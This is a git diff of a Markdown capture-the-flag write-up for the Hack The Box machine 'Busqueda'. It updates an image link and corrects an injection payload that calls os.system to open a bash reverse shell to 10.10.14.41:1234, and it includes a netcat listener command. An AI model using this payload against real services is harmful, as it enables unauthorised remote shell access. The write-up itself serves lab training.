@@ -1,5 +1,5 @@
 # <center> Busqueda </center>
-<p align="center"><img src="https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/busqueda/busqueda_logo.png"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/busqueda/busqueda_info.png"></p>
 
 ## Quick notes:
 - easy linux based machine
@@ -66,7 +66,7 @@ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 - SSTI
 - payload: 
 ```python
-,),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.41/1234 0>&1"')#
+'),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.41/1234 0>&1"')#
 ```
 
 - `nc -lnvp 1234`
